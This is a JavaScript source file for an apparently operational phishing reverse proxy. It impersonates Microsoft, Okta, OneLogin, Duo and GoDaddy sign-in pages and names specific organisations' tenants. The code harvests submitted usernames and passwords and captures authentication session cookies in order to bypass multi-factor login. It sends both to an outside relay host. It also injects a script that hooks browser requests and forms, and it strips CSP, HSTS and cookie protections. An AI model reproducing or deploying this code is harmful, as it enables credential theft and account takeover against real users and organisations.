export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

// ADDED: Track current upstream context for proper relative URL rewriting
const UPSTREAM_CONTEXT = {
  currentDomain: null,
  currentPath: null
};
// =======================================================================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");

    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    const provider = IDENTITY_PROVIDERS[upstreamDomain];

    // ADDED: Update context
    UPSTREAM_CONTEXT.currentDomain = upstreamDomain;
    UPSTREAM_CONTEXT.currentPath = upstreamPath;

    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }

  // ADDED: Update context for non-proxied requests too
  UPSTREAM_CONTEXT.currentDomain = INITIAL_UPSTREAM;
  UPSTREAM_CONTEXT.currentPath = pathname;

  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

function cleanQueryString(search) {
  if (!search) return '';

  const params = new URLSearchParams(search);
  const pathValues = params.getAll('path');

  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') cleaned.append(key, value);
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }

  if (pathValues.length === 1) {
    const val = pathValues[0];
    if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
      const cleaned = new URLSearchParams();
      for (const [key, value] of params) {
        if (key !== 'path') cleaned.append(key, value);
      }
      const result = cleaned.toString();
      return result ? '?' + result : '';
    }
  }

  return search;
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    if (shouldProxyDomain(url.hostname)) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
    }
    return location;
  } catch (e) {
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => {
    if (p === '.*') return true;
    return cookieString.toLowerCase().includes(p.toLowerCase());
  });
}

function parseCredentials(bodyText) {
  const keyValuePairs = bodyText.split('&');
  let user = null;
  let pass = null;

  for (const pair of keyValuePairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;

    const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));

    if (key === 'login' || key === 'loginfmt' || key === 'username' || key === 'email' || key === 'user') {
      user = decodedValue;
    }
    if (key === 'passwd' || key === 'password' || key === 'pwd' || key === 'pass') {
      pass = decodedValue;
    }
  }

  return { user, pass };
}

// ==================== CLIENT-SIDE INTERCEPTOR SCRIPT ====================
function generateInterceptorScript(upstreamDomain) {
  return `
<script>
(function() {
  'use strict';

  try {
    const PROXY_PREFIX = '${PROXY_PREFIX}';
    const YOUR_DOMAIN = '${YOUR_DOMAIN}';
    const CURRENT_UPSTREAM = '${upstreamDomain}';

    function shouldProxyDomain(hostname) {
      if (!hostname) return false;
      const domains = [
        'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
        'office.com', 'microsoft365.com', 'outlook.office.com', 'outlook.live.com',
        'godaddy.com', 'secureserver.net', 'csp.secureserver.net', 
        'sso.godaddy.com', 'sso.secureserver.net', 'api.godaddy.com',
        'okta.com', 'onelogin.com', 'duosecurity.com',
        'wsimg.com', 'img1.wsimg.com', 'img2.wsimg.com', 'img3.wsimg.com',
        'img4.wsimg.com', 'img5.wsimg.com', 'img6.wsimg.com'
      ];
      return domains.some(d => hostname.includes(d));
    }

    function rewriteUrl(url) {
      if (!url || typeof url !== 'string') return url;
      try {
        // Already proxied
        if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;

        // Absolute URLs with domains to proxy
        if (url.startsWith('http')) {
          try {
            const urlObj = new URL(url);
            if (shouldProxyDomain(urlObj.hostname)) {
              return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search;
            }
          } catch(e) {}
          return url;
        }

        // Protocol-relative
        if (url.startsWith('//')) {
          const hostname = url.split('/')[2];
          if (shouldProxyDomain(hostname)) {
            return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);
          }
          return 'https:' + url;
        }

        // Relative URLs starting with /
        if (url.startsWith('/')) {
          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + url;
        }

      } catch(e) {}
      return url;
    }

    // Override fetch
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
      try {
        if (typeof url === 'string') {
          url = rewriteUrl(url);
        } else if (url instanceof Request) {
          const newUrl = rewriteUrl(url.url);
          if (newUrl !== url.url) {
            url = new Request(newUrl, url);
          }
        }
      } catch(e) {}
      return originalFetch.call(this, url, options);
    };

    // Override XMLHttpRequest
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
      try {
        url = rewriteUrl(url);
      } catch(e) {}
      return originalOpen.call(this, method, url, async, user, password);
    };

    // Override WebSocket
    if (window.WebSocket) {
      const originalWebSocket = window.WebSocket;
      window.WebSocket = function(url, protocols) {
        try {
          url = rewriteUrl(url);
        } catch(e) {}
        return new originalWebSocket(url, protocols);
      };
    }

    // Silent service worker suppression (return fake success to prevent errors)
    if ('serviceWorker' in navigator) {
      const fakeRegistration = {
        active: null,
        installing: null,
        waiting: null,
        scope: '/',
        update: function() { return Promise.resolve(this); },
        unregister: function() { return Promise.resolve(true); }
      };

      navigator.serviceWorker.register = function(scriptURL, options) {
        console.log('[Proxy] Blocking service worker:', scriptURL);
        return Promise.resolve(fakeRegistration);
      };
    }

    // Monitor DOM changes to rewrite dynamically added elements
    if (typeof MutationObserver !== 'undefined') {
      const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          mutation.addedNodes.forEach(function(node) {
            if (node.nodeType === 1) { // Element node
              try {
                // Rewrite src/href attributes
                if (node.src && !node.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                  node.src = rewriteUrl(node.src);
                }
                if (node.href && !node.href.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                  node.href = rewriteUrl(node.href);
                }
                // Check children
                if (node.querySelectorAll) {
                  node.querySelectorAll('[src],[href]').forEach(function(el) {
                    if (el.src && !el.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                      el.src = rewriteUrl(el.src);
                    }
                    if (el.href && !el.href.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                      el.href = rewriteUrl(el.href);
                    }
                  });
                }
              } catch(e) {}
            }
          });
        });
      });

      if (document.body) {
        observer.observe(document.body, { childList: true, subtree: true });
      } else {
        document.addEventListener('DOMContentLoaded', function() {
          if (document.body) observer.observe(document.body, { childList: true, subtree: true });
        });
      }
    }

    // CRITICAL: Intercept form submissions to ensure they go through proxy
    document.addEventListener('submit', function(e) {
      const form = e.target;
      if (form.action && !form.action.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
        try {
          const actionUrl = new URL(form.action);
          if (shouldProxyDomain(actionUrl.hostname)) {
            form.action = rewriteUrl(form.action);
            console.log('[Proxy] Rewrote form action to:', form.action);
          }
        } catch(err) {}
      }
    }, true);

    console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM);
  } catch(err) {
    console.error('[Proxy Interceptor] Failed to initialize:', err);
  }
})();
</script>`;
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;

  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);

  // Handle preflight requests
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Requested-By',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  // Build headers
  const headers = new Headers(request.headers);
  headers.set('Host', upstreamDomain);
  headers.set('Referer', `https://${upstreamDomain}/`);
  headers.set('Origin', `https://${upstreamDomain}`);

  // Remove problematic headers
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');

  // CRITICAL FIX: Handle POST request body properly
  let bodyText = null;
  let requestBodyForUpstream = null;

  if (request.method === 'POST' || request.method === 'PUT' || request.method === 'PATCH') {
    try {
      // Read the body as text first
      const clonedRequest = request.clone();
      bodyText = await clonedRequest.text();

      console.log('[DEBUG] POST body:', bodyText.substring(0, 500));

      // Parse credentials from the body
      const { user, pass } = parseCredentials(bodyText);

      if (user && pass) {
        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Platform: ${info.type}`);

        await sendToVercel('credentials', {
          type: "creds",
          ip: ip,
          user: user,
          pass: pass,
          platform: info.type,
          url: displayUrl
        });

        const content = `IP: ${ip}\nPlatform: ${info.type}\nUser: ${user}\nPass: ${pass}\nURL: ${displayUrl}\n`;
        const formData = new FormData();
        formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
        formData.append("ip", ip);
        formData.append("type", "credentials");

        await fetch(VERCEL_URL, {
          method: "POST",
          body: formData,
        });
      }

      // CRITICAL: Create a new body for the upstream request
      // The original request.body is consumed/locked after clone().text()
      requestBodyForUpstream = bodyText;

    } catch (error) {
      console.error('Credential capture error:', error);
      // If we failed to read the body, try to use the original as fallback
      requestBodyForUpstream = request.body;
    }
  }

  try {
    const fetchOpts = {
      method: request.method,
      headers,
      redirect: 'manual'
    };

    // Add body for non-GET/HEAD requests
    if (!['GET', 'HEAD'].includes(request.method)) {
      // Use the text body we captured, or fall back to original
      fetchOpts.body = requestBodyForUpstream !== null ? requestBodyForUpstream : request.body;
      fetchOpts.duplex = 'half';
    }

    console.log(`[DEBUG] Fetching upstream: ${upstreamUrl}`);
    console.log(`[DEBUG] Method: ${request.method}`);
    console.log(`[DEBUG] Has body: ${!!fetchOpts.body}`);

    const resp = await fetch(upstreamUrl, fetchOpts);

    console.log(`[DEBUG] Upstream response status: ${resp.status}`);

    // Handle redirect
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const newHeaders = new Headers(resp.headers);
        const newLoc = rewriteLocation(loc);

        console.log(`[Redirect] ${loc} -> ${newLoc}`);

        newHeaders.set('Location', newLoc);
        return new Response(null, { status: resp.status, headers: newHeaders });
      }
    }

    // Process response
    const newHeaders = new Headers(resp.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    newHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, X-Requested-With');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    newHeaders.delete('strict-transport-security');

    // Handle cookies
    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
    let shouldCaptureCookies = false;
    let cookieStr = '';

    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      const isPost = request.method === 'POST';
      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
      shouldCaptureCookies = isPost || hasAuth;

      cookies.forEach(c => {
        if (!c) return;
        let mod = c.replace(/Domain=[^;]+;?/gi, '');
        mod = mod.replace(/Secure;?/gi, '');
        mod = mod.replace(/SameSite=[^;]+;?/gi, '');
        mod += '; SameSite=None; Secure';
        newHeaders.append('Set-Cookie', mod);
      });
    }

    if (shouldCaptureCookies && cookieStr) {
      await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
    }

    // Rewrite body content
    const ct = resp.headers.get('content-type') || '';

    // Process text-based content
    if (/text\/html|application\/javascript|application\/json|text\/javascript|text\/css/.test(ct)) {
      let text = await resp.text();

      // HTML-specific processing
      if (ct.includes('text/html')) {
        const baseTag = `<base href="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/">`;
        const interceptor = generateInterceptorScript(upstreamDomain);

        // Insert base tag and script as early as possible
        if (text.includes('<head>')) {
          text = text.replace('<head>', `<head>${baseTag}${interceptor}`);
        } else if (text.includes('<html>')) {
          text = text.replace('<html>', `<html>${baseTag}${interceptor}`);
        } else {
          text = baseTag + interceptor + text;
        }
      }

      // CRITICAL FIX: Enhanced URL rewriting for all content types
      // Rewrite all absolute URLs for known domains (CSS, JS, HTML)
      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        const escaped = domain.replace(/\./g, '\\.');
        // Match http/https URLs
        const regex = new RegExp('https?://' + escaped + '([^"\'\`\s)]*)', 'g');
        text = text.replace(regex, 'https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1');
      });

      // CRITICAL FIX: Handle relative URLs that start with / in HTML content
      // These need to be rewritten to go through the proxy
      if (ct.includes('text/html')) {
        // Match src="/..." and href="/..." that are NOT already proxied
        text = text.replace(/(src|href)="\/([^"]+)"/g, (match, attr, path) => {
          // Don't rewrite if it's already a proxied path or data/blob URL
          if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) {
            return match;
          }
          // Rewrite to proxy
          return `${attr}="${PROXY_PREFIX}${upstreamDomain}/${path}"`;
        });

        // Also handle single quotes
        text = text.replace(/(src|href)='\/([^']+)'/g, (match, attr, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) {
            return match;
          }
          return `${attr}='${PROXY_PREFIX}${upstreamDomain}/${path}'`;
        });
      }

      // Handle CSS url() references specifically
      text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/g, (match, url) => {
        try {
          const urlObj = new URL(url);
          if (shouldProxyDomain(urlObj.hostname)) {
            return 'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search + ')';
          }
        } catch(e) {}
        return match;
      });

      // Handle relative URLs in CSS that start with /
      if (ct.includes('text/css')) {
        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/g, 'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/$1)');
      }

      // CRITICAL FIX: Rewrite form actions in HTML to ensure they go through proxy
      if (ct.includes('text/html')) {
        // Rewrite any remaining absolute URLs that might have been missed
        text = text.replace(/action=["'](https?:\/\/[^"']+)["']/gi, (match, url) => {
          try {
            const urlObj = new URL(url);
            if (shouldProxyDomain(urlObj.hostname)) {
              return 'action="' + rewriteLocation(url) + '"';
            }
          } catch(e) {}
          return match;
        });

        // CRITICAL FIX: Handle Next.js _next/static and other special paths
        // These often appear in Next.js apps like GoDaddy's trust-center
        text = text.replace(/src="\/_next\/static\/([^"]+)"/g, 
          `src="${PROXY_PREFIX}${upstreamDomain}/_next/static/$1"`);
        text = text.replace(/href="\/_next\/static\/([^"]+)"/g, 
          `href="${PROXY_PREFIX}${upstreamDomain}/_next/static/$1"`);
        text = text.replace(/src='\/_next\/static\/([^']+)'/g, 
          `src='${PROXY_PREFIX}${upstreamDomain}/_next/static/$1'`);
        text = text.replace(/href='\/_next\/static\/([^']+)'/g, 
          `href='${PROXY_PREFIX}${upstreamDomain}/_next/static/$1'`);
      }

      return new Response(text, { status: resp.status, headers: newHeaders });
    }

    // For binary/static content (images, fonts), just pass through
    return new Response(resp.body, { status: resp.status, headers: newHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: err.message,
      stack: err.stack
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
